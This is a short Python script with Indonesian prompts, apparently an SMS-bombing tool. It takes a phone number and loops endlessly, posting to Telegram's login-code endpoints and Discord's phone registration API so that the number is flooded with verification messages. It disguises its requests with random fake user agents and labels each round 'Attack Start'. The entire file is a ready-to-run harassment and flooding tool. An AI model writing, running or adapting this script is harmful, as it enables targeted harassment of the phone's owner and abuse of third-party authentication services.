import requests, fake_useragent

user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
number = int(input('Masukkan nomor telepon Anda: '))
count = 0
nomer = number
support = input('Tekan ENTER untuk melakukan serangan spam dengan nomor dukungan TELEGRAM: ')

try:
    while True:
        response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
        response1 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
        response2 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
        response3 = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
        response4 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
        response5 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
        response6 = requests.post('https://discord.com/api/v9/auth/register/phone',headers=headers, data={"phone": number})
        print (number)
        count += 1
        print ("Attack Start", {count})
except Exception as e:
    print ('Ada yang tidak beres')
